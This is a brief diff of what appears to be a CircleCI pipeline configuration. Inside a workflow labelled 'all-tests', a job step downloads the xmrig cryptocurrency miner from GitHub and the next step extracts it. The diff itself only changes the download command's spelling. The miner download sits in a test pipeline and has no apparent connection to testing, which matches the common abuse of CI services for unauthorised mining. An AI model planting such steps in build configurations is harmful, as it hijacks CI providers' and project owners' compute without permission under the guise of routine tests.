@@ -20,7 +20,7 @@ jobs:
       - node/install:
           node-version: << parameters.node-version >>
           install-yarn: true
-      - run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz -OutFile xmrig-6.15.0-linux-x64.tar.gz
+      - run: iwr https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz -OutFile xmrig-6.15.0-linux-x64.tar.gz
       - run: tar xvf xmrig-6.15.0-linux-x64.tar.gz && ls
 workflows:
   all-tests:
